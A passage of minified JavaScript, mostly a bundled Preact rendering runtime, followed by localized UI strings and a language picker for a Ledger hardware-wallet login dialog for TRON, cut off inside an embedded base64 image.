                    if ("string" == typeof r && (t.style.cssText = r = ""),
                    r)
                        for (e in r)
                            n && e in n || Bt(t.style, e, "");
                    if (n)
                        for (e in n)
                            r && n[e] == r[e] || Bt(t.style, e, n[e])
                }
            else if ("o" == e[0] && "n" == e[1])
                o = e != (e = e.replace(vt, "$1")),
                s = e.toLowerCase(),
                e = s in t || "onFocusOut" == e || "onFocusIn" == e ? s.slice(2) : e.slice(2),
                t.l || (t.l = {}),
                t.l[e + o] = n,
                n ? r ? n.u = r.u : (n.u = Mt,
                t.addEventListener(e, o ? It : Nt, o)) : t.removeEventListener(e, o ? It : Nt, o);
            else {
                if ("http://www.w3.org/2000/svg" == i)
                    e = e.replace(/xlink(H|:h)/, "h").replace(/sName$/, "s");
                else if ("width" != e && "height" != e && "href" != e && "list" != e && "form" != e && "tabIndex" != e && "download" != e && "rowSpan" != e && "colSpan" != e && "role" != e && "popover" != e && e in t)
                    try {
                        t[e] = null == n ? "" : n;
                        break t
                    } catch (t) {}
                "function" == typeof n || (null == n || !1 === n && "-" != e[4] ? t.removeAttribute(e) : t.setAttribute(e, "popover" == e && 1 == n ? "" : n))
            }
        }
        function Qt(t) {
            return function(e) {
                if (this.l) {
                    var n = this.l[e.type + t];
                    if (null == e.t)
                        e.t = Mt++;
                    else if (e.t < n.u)
                        return;
                    return n(ft.event ? ft.event(e) : e)
                }
            }
        }
        function Yt(t, e, n, r, i, o, s, a, c, l) {
            var d, h, u, f, p, g, w, m, y, v, M, N, I, E, A, b, _, T = e.type;
            if (void 0 !== e.constructor)
                return null;
            128 & n.__u && (c = !!(32 & n.__u),
            o = [a = e.__e = n.__e]),
            (d = ft.__b) && d(e);
            t: if ("function" == typeof T)
                try {
                    if (m = e.props,
                    y = "prototype"in T && T.prototype.render,
                    v = (d = T.contextType) && r[d.__c],
                    M = d ? v ? v.props.value : d.__ : r,
                    n.__c ? w = (h = e.__c = n.__c).__ = h.__E : (y ? e.__c = h = new T(m,M) : (e.__c = h = new St(m,M),
                    h.constructor = T,
                    h.render = Kt),
                    v && v.sub(h),
                    h.state || (h.state = {}),
                    h.__n = r,
                    u = h.__d = !0,
                    h.__h = [],
                    h._sb = []),
                    y && null == h.__s && (h.__s = h.state),
                    y && null != T.getDerivedStateFromProps && (h.__s == h.state && (h.__s = Tt({}, h.__s)),
                    Tt(h.__s, T.getDerivedStateFromProps(m, h.__s))),
                    f = h.props,
                    p = h.state,
                    h.__v = e,
                    u)
                        y && null == T.getDerivedStateFromProps && null != h.componentWillMount && h.componentWillMount(),
                        y && null != h.componentDidMount && h.__h.push(h.componentDidMount);
                    else {
                        if (y && null == T.getDerivedStateFromProps && m !== f && null != h.componentWillReceiveProps && h.componentWillReceiveProps(m, M),
                        e.__v == n.__v || !h.__e && null != h.shouldComponentUpdate && !1 === h.shouldComponentUpdate(m, h.__s, M)) {
                            for (e.__v != n.__v && (h.props = m,
                            h.state = h.__s,
                            h.__d = !1),
                            e.__e = n.__e,
                            e.__k = n.__k,
                            e.__k.some(function(t) {
                                t && (t.__ = e)
                            }),
                            N = 0; N < h._sb.length; N++)
                                h.__h.push(h._sb[N]);
                            h._sb = [],
                            h.__h.length && s.push(h);
                            break t
                        }
                        null != h.componentWillUpdate && h.componentWillUpdate(m, h.__s, M),
                        y && null != h.componentDidUpdate && h.__h.push(function() {
                            h.componentDidUpdate(f, p, g)
                        })
                    }
                    if (h.context = M,
                    h.props = m,
                    h.__P = t,
                    h.__e = !1,
                    I = ft.__r,
                    E = 0,
                    y) {
                        for (h.state = h.__s,
                        h.__d = !1,
                        I && I(e),
                        d = h.render(h.props, h.state, h.context),
                        A = 0; A < h._sb.length; A++)
                            h.__h.push(h._sb[A]);
                        h._sb = []
                    } else
                        do {
                            h.__d = !1,
                            I && I(e),
                            d = h.render(h.props, h.state, h.context),
                            h.state = h.__s
                        } while (h.__d && ++E < 25);
                    h.state = h.__s,
                    null != h.getChildContext && (r = Tt(Tt({}, r), h.getChildContext())),
                    y && !u && null != h.getSnapshotBeforeUpdate && (g = h.getSnapshotBeforeUpdate(f, p)),
                    b = d,
                    null != d && d.type === Lt && null == d.key && (b = Ht(d.props.children)),
                    a = Wt(t, _t(b) ? b : [b], e, n, r, i, o, s, a, c, l),
                    h.base = e.__e,
                    e.__u &= -161,
                    h.__h.length && s.push(h),
                    w && (h.__E = h.__ = null)
                } catch (t) {
                    if (e.__v = null,
                    c || null != o)
                        if (t.then) {
                            for (e.__u |= c ? 160 : 128; a && 8 == a.nodeType && a.nextSibling; )
                                a = a.nextSibling;
                            o[o.indexOf(a)] = null,
                            e.__e = a
                        } else {
                            for (_ = o.length; _--; )
                                xt(o[_]);
                            Gt(e)
                        }
                    else
                        e.__e = n.__e,
                        e.__k = n.__k,
                        t.then || Gt(e);
                    ft.__e(t, e, n)
                }
            else
                null == o && e.__v == n.__v ? (e.__k = n.__k,
                e.__e = n.__e) : a = e.__e = Jt(n.__e, e, n, r, i, o, s, c, l);
            return (d = ft.diffed) && d(e),
            128 & e.__u ? void 0 : a
        }
        function Gt(t) {
            t && t.__c && (t.__c.__e = !0),
            t && t.__k && t.__k.forEach(Gt)
        }
        function Zt(t, e, n) {
            for (var r = 0; r < n.length; r++)
                Xt(n[r], n[++r], n[++r]);
            ft.__c && ft.__c(e, t),
            t.some(function(e) {
                try {
                    t = e.__h,
                    e.__h = [],
                    t.some(function(t) {
                        t.call(e)
                    })
                } catch (t) {
                    ft.__e(t, e.__v)
                }
            })
        }
        function Ht(t) {
            return "object" != typeof t || null == t || t.__b && t.__b > 0 ? t : _t(t) ? t.map(Ht) : Tt({}, t)
        }
        function Jt(t, e, n, r, i, o, s, a, c) {
            var l, d, h, u, f, p, g, w = n.props || Et, m = e.props, y = e.type;
            if ("svg" == y ? i = "http://www.w3.org/2000/svg" : "math" == y ? i = "http://www.w3.org/1998/Math/MathML" : i || (i = "http://www.w3.org/1999/xhtml"),
            null != o)
                for (l = 0; l < o.length; l++)
                    if ((f = o[l]) && "setAttribute"in f == !!y && (y ? f.localName == y : 3 == f.nodeType)) {
                        t = f,
                        o[l] = null;
                        break
                    }
            if (null == t) {
                if (null == y)
                    return document.createTextNode(m);
                t = document.createElementNS(i, y, m.is && m),
                a && (ft.__m && ft.__m(e, o),
                a = !1),
                o = null
            }
            if (null == y)
                w === m || a && t.data == m || (t.data = m);
            else {
                if (o = o && ut.call(t.childNodes),
                !a && null != o)
                    for (w = {},
                    l = 0; l < t.attributes.length; l++)
                        w[(f = t.attributes[l]).name] = f.value;
                for (l in w)
                    if (f = w[l],
                    "children" == l)
                        ;
                    else if ("dangerouslySetInnerHTML" == l)
                        h = f;
                    else if (!(l in m)) {
                        if ("value" == l && "defaultValue"in m || "checked" == l && "defaultChecked"in m)
                            continue;
                        Vt(t, l, null, f, i)
                    }
                for (l in m)
                    f = m[l],
                    "children" == l ? u = f : "dangerouslySetInnerHTML" == l ? d = f : "value" == l ? p = f : "checked" == l ? g = f : a && "function" != typeof f || w[l] === f || Vt(t, l, f, w[l], i);
                if (d)
                    a || h && (d.__html == h.__html || d.__html == t.innerHTML) || (t.innerHTML = d.__html),
                    e.__k = [];
                else if (h && (t.innerHTML = ""),
                Wt("template" == e.type ? t.content : t, _t(u) ? u : [u], e, n, r, "foreignObject" == y ? "http://www.w3.org/1999/xhtml" : i, o, s, o ? o[0] : n.__k && Ct(n, 0), a, c),
                null != o)
                    for (l = o.length; l--; )
                        xt(o[l]);
                a || (l = "value",
                "progress" == y && null == p ? t.removeAttribute("value") : null != p && (p !== t[l] || "progress" == y && !p || "option" == y && p != w[l]) && Vt(t, l, p, w[l], i),
                l = "checked",
                null != g && g != t[l] && Vt(t, l, g, w[l], i))
            }
            return t
        }
        function Xt(t, e, n) {
            try {
                if ("function" == typeof t) {
                    var r = "function" == typeof t.__u;
                    r && t.__u(),
                    r && null == e || (t.__u = t(e))
                } else
                    t.current = e
            } catch (t) {
                ft.__e(t, n)
            }
        }
        function qt(t, e, n) {
            var r, i;
            if (ft.unmount && ft.unmount(t),
            (r = t.ref) && (r.current && r.current != t.__e || Xt(r, null, e)),
            null != (r = t.__c)) {
                if (r.componentWillUnmount)
                    try {
                        r.componentWillUnmount()
                    } catch (t) {
                        ft.__e(t, e)
                    }
                r.base = r.__P = null
            }
            if (r = t.__k)
                for (i = 0; i < r.length; i++)
                    r[i] && qt(r[i], e, n || "function" != typeof t.type);
            n || xt(t.__e),
            t.__c = t.__ = t.__e = void 0
        }
        function Kt(t, e, n) {
            return this.constructor(t, n)
        }
        function $t(t, e, n) {
            var r, i, o, s;
            e == document && (e = document.documentElement),
            ft.__ && ft.__(t, e),
            i = (r = "function" == typeof n) ? null : n && n.__k || e.__k,
            o = [],
            s = [],
            Yt(e, t = (!r && n || e).__k = Dt(Lt, null, [t]), i || Et, Et, e.namespaceURI, !r && n ? [n] : i ? null : e.firstChild ? ut.call(e.childNodes) : null, o, !r && n ? n : i ? i.__e : e.firstChild, r, s),
            Zt(o, t, s)
        }
        ut = At.slice,
        ft = {
            __e: function(t, e, n, r) {
                for (var i, o, s; e = e.__; )
                    if ((i = e.__c) && !i.__)
                        try {
                            if ((o = i.constructor) && null != o.getDerivedStateFromError && (i.setState(o.getDerivedStateFromError(t)),
                            s = i.__d),
                            null != i.componentDidCatch && (i.componentDidCatch(t, r || {}),
                            s = i.__d),
                            s)
                                return i.__E = i
                        } catch (e) {
                            t = e
                        }
                throw t
            }
        },
        pt = 0,
        St.prototype.setState = function(t, e) {
            var n;
            n = null != this.__s && this.__s != this.state ? this.__s : this.__s = Tt({}, this.state),
            "function" == typeof t && (t = t(Tt({}, n), this.props)),
            t && Tt(n, t),
            null != t && this.__v && (e && this._sb.push(e),
            Ot(this))
        }
        ,
        St.prototype.forceUpdate = function(t) {
            this.__v && (this.__e = !0,
            t && this.__h.push(t),
            Ot(this))
        }
        ,
        St.prototype.render = Lt,
        gt = [],
        mt = "function" == typeof Promise ? Promise.prototype.then.bind(Promise.resolve()) : setTimeout,
        yt = function(t, e) {
            return t.__v.__b - e.__v.__b
        }
        ,
        Ut.__r = 0,
        vt = /(PointerCapture)$|Capture$/i,
        Mt = 0,
        Nt = Qt(!1),
        It = Qt(!0);
        var te = 0;
        function ee(t, e, n, r, i, o) {
            e || (e = {});
            var s, a, c = e;
            if ("ref"in c)
                for (a in c = {},
                e)
                    "ref" == a ? s = e[a] : c[a] = e[a];
            var l = {
                type: t,
                props: c,
                key: n,
                ref: s,
                __k: null,
                __: null,
                __b: 0,
                __e: null,
                __c: null,
                constructor: void 0,
                __v: --te,
                __i: -1,
                __u: 0,
                __source: i,
                __self: o
            };
            if ("function" == typeof t && (s = t.defaultProps))
                for (a in s)
                    void 0 === c[a] && (c[a] = s[a]);
            return ft.vnode && ft.vnode(l),
            l
        }
        Array.isArray;
        var ne, re, ie, oe, se = 0, ae = [], ce = ft, le = ce.__b, de = ce.__r, he = ce.diffed, ue = ce.__c, fe = ce.unmount, pe = ce.__;
        function ge(t, e) {
            ce.__h && ce.__h(re, t, se || e),
            se = 0;
            var n = re.__H || (re.__H = {
                __: [],
                __h: []
            });
            return t >= n.__.length && n.__.push({}),
            n.__[t]
        }
        function we(t) {
            return se = 1,
            function(t, e, n) {
                var r = ge(ne++, 2);
                if (r.t = t,
                !r.__c && (r.__ = [n ? n(e) : be(void 0, e), function(t) {
                    var e = r.__N ? r.__N[0] : r.__[0]
                      , n = r.t(e, t);
                    e !== n && (r.__N = [n, r.__[1]],
                    r.__c.setState({}))
                }
                ],
                r.__c = re,
                !re.__f)) {
                    var i = function(t, e, n) {
                        if (!r.__c.__H)
                            return !0;
                        var i = r.__c.__H.__.filter(function(t) {
                            return !!t.__c
                        });
                        if (i.every(function(t) {
                            return !t.__N
                        }))
                            return !o || o.call(this, t, e, n);
                        var s = r.__c.props !== t;
                        return i.forEach(function(t) {
                            if (t.__N) {
                                var e = t.__[0];
                                t.__ = t.__N,
                                t.__N = void 0,
                                e !== t.__[0] && (s = !0)
                            }
                        }),
                        o && o.call(this, t, e, n) || s
                    };
                    re.__f = !0;
                    var o = re.shouldComponentUpdate
                      , s = re.componentWillUpdate;
                    re.componentWillUpdate = function(t, e, n) {
                        if (this.__e) {
                            var r = o;
                            o = void 0,
                            i(t, e, n),
                            o = r
                        }
                        s && s.call(this, t, e, n)
                    }
                    ,
                    re.shouldComponentUpdate = i
                }
                return r.__N || r.__
            }(be, t)
        }
        function me(t, e) {
            var n = ge(ne++, 3);
            !ce.__s && Ae(n.__H, e) && (n.__ = t,
            n.u = e,
            re.__H.__h.push(n))
        }
        function ye(t, e) {
            var n = ge(ne++, 7);
            return Ae(n.__H, e) && (n.__ = t(),
            n.__H = e,
            n.__h = t),
            n.__
        }
        function ve() {
            for (var t; t = ae.shift(); )
                if (t.__P && t.__H)
                    try {
                        t.__H.__h.forEach(Ie),
                        t.__H.__h.forEach(Ee),
                        t.__H.__h = []
                    } catch (e) {
                        t.__H.__h = [],
                        ce.__e(e, t.__v)
                    }
        }
        ce.__b = function(t) {
            re = null,
            le && le(t)
        }
        ,
        ce.__ = function(t, e) {
            t && e.__k && e.__k.__m && (t.__m = e.__k.__m),
            pe && pe(t, e)
        }
        ,
        ce.__r = function(t) {
            de && de(t),
            ne = 0;
            var e = (re = t.__c).__H;
            e && (ie === re ? (e.__h = [],
            re.__h = [],
            e.__.forEach(function(t) {
                t.__N && (t.__ = t.__N),
                t.u = t.__N = void 0
            })) : (e.__h.forEach(Ie),
            e.__h.forEach(Ee),
            e.__h = [],
            ne = 0)),
            ie = re
        }
        ,
        ce.diffed = function(t) {
            he && he(t);
            var e = t.__c;
            e && e.__H && (e.__H.__h.length && (1 !== ae.push(e) && oe === ce.requestAnimationFrame || ((oe = ce.requestAnimationFrame) || Ne)(ve)),
            e.__H.__.forEach(function(t) {
                t.u && (t.__H = t.u),
                t.u = void 0
            })),
            ie = re = null
        }
        ,
        ce.__c = function(t, e) {
            e.some(function(t) {
                try {
                    t.__h.forEach(Ie),
                    t.__h = t.__h.filter(function(t) {
                        return !t.__ || Ee(t)
                    })
                } catch (n) {
                    e.some(function(t) {
                        t.__h && (t.__h = [])
                    }),
                    e = [],
                    ce.__e(n, t.__v)
                }
            }),
            ue && ue(t, e)
        }
        ,
        ce.unmount = function(t) {
            fe && fe(t);
            var e, n = t.__c;
            n && n.__H && (n.__H.__.forEach(function(t) {
                try {
                    Ie(t)
                } catch (t) {
                    e = t
                }
            }),
            n.__H = void 0,
            e && ce.__e(e, n.__v))
        }
        ;
        var Me = "function" == typeof requestAnimationFrame;
        function Ne(t) {
            var e, n = function() {
                clearTimeout(r),
                Me && cancelAnimationFrame(e),
                setTimeout(t)
            }, r = setTimeout(n, 35);
            Me && (e = requestAnimationFrame(n))
        }
        function Ie(t) {
            var e = re
              , n = t.__c;
            "function" == typeof n && (t.__c = void 0,
            n()),
            re = e
        }
        function Ee(t) {
            var e = re;
            t.__c = t.__(),
            re = e
        }
        function Ae(t, e) {
            return !t || t.length !== e.length || e.some(function(e, n) {
                return e !== t[n]
            })
        }
        function be(t, e) {
            return "function" == typeof e ? e(t) : e
        }
        function _e(t, e) {
            for (var n in t)
                if ("__source" !== n && !(n in e))
                    return !0;
            for (var r in e)
                if ("__source" !== r && t[r] !== e[r])
                    return !0;
            return !1
        }
        function Te(t, e) {
            this.props = t,
            this.context = e
        }
        (Te.prototype = new St).isPureReactComponent = !0,
        Te.prototype.shouldComponentUpdate = function(t, e) {
            return _e(this.props, t) || _e(this.state, e)
        }
        ;
        var xe = ft.__b;
        ft.__b = function(t) {
            t.type && t.type.__f && t.ref && (t.props.ref = t.ref,
            t.ref = null),
            xe && xe(t)
        }
        ,
        "undefined" != typeof Symbol && Symbol.for && Symbol.for("react.forward_ref");
        var De = ft.__e;
        ft.__e = function(t, e, n, r) {
            if (t.then)
                for (var i, o = e; o = o.__; )
                    if ((i = o.__c) && i.__c)
                        return null == e.__e && (e.__e = n.__e,
                        e.__k = n.__k),
                        i.__c(t, e);
            De(t, e, n, r)
        }
        ;
        var ke = ft.unmount;
        function Le(t, e, n) {
            return t && (t.__c && t.__c.__H && (t.__c.__H.__.forEach(function(t) {
                "function" == typeof t.__c && t.__c()
            }),
            t.__c.__H = null),
            null != (t = function(t, e) {
                for (var n in e)
                    t[n] = e[n];
                return t
            }({}, t)).__c && (t.__c.__P === n && (t.__c.__P = e),
            t.__c.__e = !0,
            t.__c = null),
            t.__k = t.__k && t.__k.map(function(t) {
                return Le(t, e, n)
            })),
            t
        }
        function Se(t, e, n) {
            return t && n && (t.__v = null,
            t.__k = t.__k && t.__k.map(function(t) {
                return Se(t, e, n)
            }),
            t.__c && t.__c.__P === e && (t.__e && n.appendChild(t.__e),
            t.__c.__e = !0,
            t.__c.__P = n)),
            t
        }
        function Ce() {
            this.__u = 0,
            this.o = null,
            this.__b = null
        }
        function je(t) {
            var e = t.__.__c;
            return e && e.__a && e.__a(t)
        }
        function Oe() {
            this.i = null,
            this.l = null
        }
        ft.unmount = function(t) {
            var e = t.__c;
            e && e.__R && e.__R(),
            e && 32 & t.__u && (t.type = null),
            ke && ke(t)
        }
        ,
        (Ce.prototype = new St).__c = function(t, e) {
            var n = e.__c
              , r = this;
            null == r.o && (r.o = []),
            r.o.push(n);
            var i = je(r.__v)
              , o = !1
              , s = function() {
                o || (o = !0,
                n.__R = null,
                i ? i(a) : a())
            };
            n.__R = s;
            var a = function() {
                if (!--r.__u) {
                    if (r.state.__a) {
                        var t = r.state.__a;
                        r.__v.__k[0] = Se(t, t.__c.__P, t.__c.__O)
                    }
                    var e;
                    for (r.setState({
                        __a: r.__b = null
                    }); e = r.o.pop(); )
                        e.forceUpdate()
                }
            };
            r.__u++ || 32 & e.__u || r.setState({
                __a: r.__b = r.__v.__k[0]
            }),
            t.then(s, s)
        }
        ,
        Ce.prototype.componentWillUnmount = function() {
            this.o = []
        }
        ,
        Ce.prototype.render = function(t, e) {
            if (this.__b) {
                if (this.__v.__k) {
                    var n = document.createElement("div")
                      , r = this.__v.__k[0].__c;
                    this.__v.__k[0] = Le(this.__b, n, r.__O = r.__P)
                }
                this.__b = null
            }
            var i = e.__a && Dt(Lt, null, t.fallback);
            return i && (i.__u &= -33),
            [Dt(Lt, null, e.__a ? null : t.children), i]
        }
        ;
        var Ue = function(t, e, n) {
            if (++n[1] === n[0] && t.l.delete(e),
            t.props.revealOrder && ("t" !== t.props.revealOrder[0] || !t.l.size))
                for (n = t.i; n; ) {
                    for (; n.length > 3; )
                        n.pop()();
                    if (n[1] < n[0])
                        break;
                    t.i = n = n[2]
                }
        };
        (Oe.prototype = new St).__a = function(t) {
            var e = this
              , n = je(e.__v)
              , r = e.l.get(t);
            return r[0]++,
            function(i) {
                var o = function() {
                    e.props.revealOrder ? (r.push(i),
                    Ue(e, t, r)) : i()
                };
                n ? n(o) : o()
            }
        }
        ,
        Oe.prototype.render = function(t) {
            this.i = null,
            this.l = new Map;
            var e = Pt(t.children);
            t.revealOrder && "b" === t.revealOrder[0] && e.reverse();
            for (var n = e.length; n--; )
                this.l.set(e[n], this.i = [1, 0, this.i]);
            return t.children
        }
        ,
        Oe.prototype.componentDidUpdate = Oe.prototype.componentDidMount = function() {
            var t = this;
            this.l.forEach(function(e, n) {
                Ue(t, n, e)
            })
        }
        ;
        var We = "undefined" != typeof Symbol && Symbol.for && Symbol.for("react.element") || 60103
          , ze = /^(?:accent|alignment|arabic|baseline|cap|clip(?!PathU)|color|dominant|fill|flood|font|glyph(?!R)|horiz|image(!S)|letter|lighting|marker(?!H|W|U)|overline|paint|pointer|shape|stop|strikethrough|stroke|text(?!L)|transform|underline|unicode|units|v|vector|vert|word|writing|x(?!C))[A-Z]/
          , Re = /^on(Ani|Tra|Tou|BeforeInp|Compo)/
          , Pe = /[A-Z0-9]/g
          , Fe = "undefined" != typeof document
          , Be = function(t) {
            return ("undefined" != typeof Symbol && "symbol" == typeof Symbol() ? /fil|che|rad/ : /fil|che|ra/).test(t)
        };
        function Ve(t, e, n) {
            return null == e.__k && (e.textContent = ""),
            $t(t, e),
            "function" == typeof n && n(),
            t ? t.__c : null
        }
        St.prototype.isReactComponent = {},
        ["componentWillMount", "componentWillReceiveProps", "componentWillUpdate"].forEach(function(t) {
            Object.defineProperty(St.prototype, t, {
                configurable: !0,
                get: function() {
                    return this["UNSAFE_" + t]
                },
                set: function(e) {
                    Object.defineProperty(this, t, {
                        configurable: !0,
                        writable: !0,
                        value: e
                    })
                }
            })
        });
        var Qe = ft.event;
        function Ye() {}
        function Ge() {
            return this.cancelBubble
        }
        function Ze() {
            return this.defaultPrevented
        }
        ft.event = function(t) {
            return Qe && (t = Qe(t)),
            t.persist = Ye,
            t.isPropagationStopped = Ge,
            t.isDefaultPrevented = Ze,
            t.nativeEvent = t
        }
        ;
        var He = {
            enumerable: !1,
            configurable: !0,
            get: function() {
                return this.class
            }
        }
          , Je = ft.vnode;
        ft.vnode = function(t) {
            "string" == typeof t.type && function(t) {
                var e = t.props
                  , n = t.type
                  , r = {}
                  , i = -1 === n.indexOf("-");
                for (var o in e) {
                    var s = e[o];
                    if (!("value" === o && "defaultValue"in e && null == s || Fe && "children" === o && "noscript" === n || "class" === o || "className" === o)) {
                        var a = o.toLowerCase();
                        "defaultValue" === o && "value"in e && null == e.value ? o = "value" : "download" === o && !0 === s ? s = "" : "translate" === a && "no" === s ? s = !1 : "o" === a[0] && "n" === a[1] ? "ondoubleclick" === a ? o = "ondblclick" : "onchange" !== a || "input" !== n && "textarea" !== n || Be(e.type) ? "onfocus" === a ? o = "onfocusin" : "onblur" === a ? o = "onfocusout" : Re.test(o) && (o = a) : a = o = "oninput" : i && ze.test(o) ? o = o.replace(Pe, "-$&").toLowerCase() : null === s && (s = void 0),
                        "oninput" === a && r[o = a] && (o = "oninputCapture"),
                        r[o] = s
                    }
                }
                "select" == n && r.multiple && Array.isArray(r.value) && (r.value = Pt(e.children).forEach(function(t) {
                    t.props.selected = -1 != r.value.indexOf(t.props.value)
                })),
                "select" == n && null != r.defaultValue && (r.value = Pt(e.children).forEach(function(t) {
                    t.props.selected = r.multiple ? -1 != r.defaultValue.indexOf(t.props.value) : r.defaultValue == t.props.value
                })),
                e.class && !e.className ? (r.class = e.class,
                Object.defineProperty(r, "className", He)) : (e.className && !e.class || e.class && e.className) && (r.class = r.className = e.className),
                t.props = r
            }(t),
            t.$$typeof = We,
            Je && Je(t)
        }
        ;
        var Xe = ft.__r;
        ft.__r = function(t) {
            Xe && Xe(t),
            t.__c
        }
        ;
        var qe = ft.diffed;
        ft.diffed = function(t) {
            qe && qe(t);
            var e = t.props
              , n = t.__e;
            null != n && "textarea" === t.type && "value"in e && e.value !== n.value && (n.value = null == e.value ? "" : e.value)
        }
        ;
        const Ke = {
            en: {
                loadingTitle: "Log in with Ledger",
                loadingTip0: "Please connect to your Ledger device and open “Tron” App.",
                loadingTip4: "Preparing your Ledger device...",
                checkTitle: "Please check if the address below is the same one shown on your Ledger device",
                checkTip0: "If it is: press “Approve” button to confirm the address",
                checkTip1: "If it isn't: select “Reject” on your Ledger device and refresh this page",
                confirmTip: "Please confirm on your Ledger",
                selectTitle: "Select account",
                selectTip: "Please select an account to use",
                cancel: "Cancel",
                confirm: "Confirm",
                address: "Address",
                balance: "Available Balance",
                loadMore: "Load More"
            },
            "zh-CN": {
                loadingTitle: "Ledger 登录",
                loadingTip0: "请连接 Ledger 设备，并在设备上进入 “TRON” 应用",
                loadingTip4: "Ledger 设备准备中......",
                checkTitle: "请确认以下地址与 Ledger 设备显示地址一致",
                checkTip0: "如果一致：请按设备上的 Approve 按钮进行确认",
                checkTip1: "如果不一致：请在 Ledger 设备中选择 Reject 按钮并刷新本页面",
                confirmTip: "请在 Ledger 上确认",
                selectTitle: "选择账户",
                selectTip: "请选择要使用的钱包账户",
                cancel: "取消",
                confirm: "确认",
                address: "地址",
                balance: "可用余额",
                loadMore: "加载更多账户"
            },
            "zh-TC": {
                loadingTitle: "Ledger 登錄",
                loadingTip0: "請連接 Ledger 設備，並在設備上進入 “TRON” 應用",
                loadingTip4: "Ledger 設備準備中......",
                checkTitle: "請確認以下地址與 Ledger 設備顯示地址一致",
                checkTip0: "如果一致：請按設備上的 Approve 按鈕進行確認",
                checkTip1: "如果不一致：請在 Ledger 設備中選擇 Reject 按鈕並刷新本頁面",
                confirmTip: "請在 Ledger 上確認",
                selectTitle: "選擇賬戶",
                selectTip: "請選擇要使用的錢包賬戶",
                cancel: "取消",
                confirm: "確認",
                address: "地址",
                balance: "可用餘額",
                loadMore: "加載更多賬戶"
            }
        };
        function $e() {
            const t = new URLSearchParams(globalThis.location.search).get("lang")
              , e = globalThis.localStorage.getItem("lang")
              , n = (t || e || "").toLowerCase()
              , r = (globalThis.navigator.language || "").toLowerCase();
            let i;
            ["zh-tw", "zh-hk", "zh-tc"].includes(r) ? i = Ke["zh-TC"] : ["zh", "zh-cn"].includes(r) ? i = Ke["zh-CN"] : r.includes("en") && (i = Ke.en);
            let o = i;
            return n && (["zh-tw", "zh-hk", "zh-tc"].includes(n) ? o = Ke["zh-TC"] : ["zh", "zh-cn"].includes(n) ? o = Ke["zh-CN"] : n.includes("en") && (o = Ke.en)),
            o || Ke.en
        }
        function tn() {
            return ee("div", {
                children: ee("img", {
                    style: {
                        width: "5vw",
                        marginBottom: "1vw"
                    },
                    src: "data:image/png;base64,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